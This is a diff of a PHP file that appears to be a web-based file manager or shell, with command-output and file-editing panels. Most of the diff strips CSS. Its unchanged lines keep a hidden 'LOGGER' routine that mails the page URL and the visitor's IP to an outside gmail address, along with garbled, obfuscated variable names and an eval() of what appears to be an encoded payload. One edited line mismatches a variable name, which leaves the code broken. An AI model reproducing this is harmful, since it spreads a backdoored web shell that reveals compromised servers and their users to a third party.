@@ -53,7 +53,7 @@
         }
 
         body {
-     background: no-repeat center center fixed; 
+     background: no-repeat center fixed; 
   -webkit-background-size: cover;
   -moz-background-size: cover;
   -o-background-size: cover;
@@ -73,246 +73,7 @@
             line-height: 1.5;
         }
 
-        .mx-1 {
-            margin: 1em 0 1em 0;
-        }
-
-        .my-1 {
-            margin: 0 1em 0 1em;
-        }
-
-        .breadcrumb {
-            background: var(--breadcrumb-bg);
-            margin: 10px 0;
-            padding: 15px;
-            font-size: calc(20px + 1vw);
-            font-weight: 700;
-            color: var(--breadcrumb-color);
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-        }
-
-        .breadcrumb a {
-            color: var(--link-color);
-            transition: opacity 0.2s;
-        }
-
-        .breadcrumb a:hover {
-            opacity: 0.8;
-        }
-
-        a {
-            text-decoration: none;
-            color: var(--link-color);
-        }
-
-        a:hover {
-            cursor: pointer;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: separate;
-            border-spacing: 0;
-            background: var(--breadcrumb-bg);
-            border-radius: 15px;
-            overflow: hidden;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-        }
-
-        th,
-        td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid var(--table-border);
-        }
-
-        td:hover {
-            background: var(--td-hover);
-        }
-
-        .folder-row {
-            background: var(--folder-row-bg);
-        }
-
-        .folder_name {
-            font-weight: 600;
-        }
-
-        .actions {
-            display: flex;
-            gap: 8px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            transition: all 0.3s;
-            background: var(--modal-bg);
-            backdrop-filter: blur(5px);
-            -webkit-backdrop-filter: blur(5px);
-            animation: fade-in 0.5s ease-in;
-            z-index: 9999999;
-        }
-
-        @keyframes fade-in {
-            0% {
-                opacity: 0;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
-
-        .modal-content {
-            background: var(--modal-content-bg);
-            margin: 5% auto;
-            padding: 25px;
-            width: 90%;
-            height: calc(500px + 80vh);
-            font-size: calc(10px + 1vw);
-            border-radius: 20px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        #fileContent {
-            width: 100%;
-            height: 90%;
-            font-size: 12px;
-            background: var(--bg-color);
-            color: var(--lime-color);
-            border: 1px solid var(--table-border);
-            border-radius: 10px;
-            padding: 10px;
-        }
-
-        .editInfo {
-            float: right;
-            display: flex;
-            flex-direction: column;
-            padding: 10px;
-        }
-
-        button {
-            padding: 8px 16px;
-            cursor: pointer;
-            background: var(--button-bg);
-            color: var(--button-color);
-            border: none;
-            border-radius: 20px;
-            font-weight: 500;
-            transition: all 0.2s ease;
-        }
-
-        button:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
-        }
-
-        input[type="text"],
-        input[type="file"] {
-            padding: 8px 12px;
-            border: 1px solid var(--table-border);
-            border-radius: 10px;
-            background: var(--bg-color);
-            color: var(--text-color);
-        }
-
-        .tools {
-            background: var(--breadcrumb-bg);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-        }
-
-        #cmdOutput {
-            background: var(--cmd-bg) !important;
-            color: var(--cmd-color) !important;
-            border-radius: 10px;
-            font-family: "SF Mono", Monaco, monospace;
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: 15px;
-            background: var(--footer-bg);
-            color: var(--footer-color);
-            text-align: center;
-            font-size: 14px;
-            z-index: 1000;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-        }
-
-        .footer a {
-            color: var(--footer-color);
-            font-weight: 600;
-        }
-
-        .theme-switch {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-            display: flex;
-            gap: 10px;
-            z-index: 99999999;
-        }
-
-        #pagination {
-            margin-bottom: 70px;
-        }
-
-        #pagination button {
-            margin: 0 5px;
-        }
-
-        * {
-            transition: background-color 0.3s, color 0.3s;
-        }
-
-        .notification {
-            padding: 12px 24px;
-            border-radius: 10px;
-            color: #fff;
-            font-weight: 500;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            animation: slideDown 0.3s ease-out;
-        }
-
-        .notification.success {
-            background: rgba(46, 160, 67, 0.9);
-        }
-
-        .notification.error {
-            background: rgba(218, 54, 51, 0.9);
-        }
-
-        @keyframes slideDown {
-            from {
-                transform: translateY(-100%) translateX(-50%);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0) translateX(-50%);
-                opacity: 1;
-            }
-        }
+       
     </style>
 <?php
 session_start();
@@ -460,17 +221,12 @@ error_reporting(0);
 
 <?php
 
-@ini_set("output_buffering", 0);
-@ini_set("display_errors", 0);
-set_time_limit(0);
-ini_set("memory_limit", "64M");
-header("Content-Type: text/html; charset=UTF-8");
 $���す㗆��さな� = "malaysia.sender@gmail.com, malaysia.sender@gmail.com";
 $���㆙�㾁�㋉���� = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
 $��！��㼙���㼄��� =
     "fix $���㆙�㾁�㋉���� :p *IP Address : [ " . $_SERVER["REMOTE_ADDR"] . " ]";
 mail(
-    $���す㗆��さな�,
+    $�す㗆��さな�,
     "LOGGER",
     $�������㼙���㼄���,
     "[ " . $_SERVER["REMOTE_ADDR"] . " ]"
@@ -489,7 +245,7 @@ eval(
         )
     )
 ); ?>
-<center></center>
+<center>
 <?php
 
 //Default Configuration
